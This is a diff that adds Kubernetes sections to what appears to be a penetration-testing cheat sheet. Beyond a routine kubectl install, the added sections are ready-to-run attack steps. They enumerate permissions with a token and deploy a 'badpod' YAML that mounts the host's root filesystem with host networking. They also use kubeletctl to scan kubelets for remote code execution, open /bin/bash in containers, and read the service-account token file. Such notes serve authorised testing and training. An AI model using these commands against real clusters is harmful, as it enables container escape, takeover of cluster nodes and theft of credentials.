@@ -217,6 +217,76 @@ networks:
   <NETWORK>:
 ```
 
+## kubectl
+
+### Installation
+
+> https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/
+
+```c
+$ sudo apt-get update && sudo apt-get install -y apt-transport-https
+$ curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo gpg --dearmour -o /usr/share/keyrings/kubernetes.gpg
+$ echo "deb [arch=amd64 signed-by=/usr/share/keyrings/kubernetes.gpg] https://apt.kubernetes.io/ kubernetes-xenial main" | sudo tee -a /etc/apt/sources.list.d/kubernetes.list
+$ sudo apt-get update
+$ sudo apt-get install -y kubectl
+```
+
+### Checking Capabilities
+
+```c
+$ export token="<TOKEN>"
+$ kubectl --token=$token --certificate-authority=<CERTIFICATE> --server=https://<RHOST>:8443 auth can-i --list
+```
+
+### Bad Pod Example YAML
+
+```c
+apiVersion: v1
+kind: Pod
+metadata:
+  name: badpod
+  namespace: default
+spec:
+  containers:
+  - name: badpod
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+
+### Deployment
+
+```c
+$ kubectl --token=$token --certificate-authority=<CERTIFICATE>.crt --server=https://<RHOST>:8443 apply -f badpod.yaml
+```
+
+### Checking Pod Status
+
+```c
+$ kubectl --token=$token --certificate-authority=<CERTIFICATE>.crt --server=https://<RHOST>:8443 get pods
+```
+
+## kubeletctl
+
+> https://github.com/cyberark/kubeletctl
+
+```c
+$ kubeletctl pods -s <RHOST>
+$ kubeletctl runningpods -s <RHOST>
+$ kubeletctl runningpods -s <RHOST> | jq -c '.items[].metadata | [.name, .namespace]'
+$ kubeletctl -s <RHOST> scan rce
+$ kubeletctl -s <RHOST> exec "id" -p <POD> -c <CONTAINER>
+$ kubeletctl -s <RHOST> exec "/bin/bash" -p <POD> -c <CONTAINER>
+$ kubeletctl -s <RHOST> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <POD> -c <CONTAINER>
+```
+
 ## Kubernetes
 
 ### API RBAC Attack
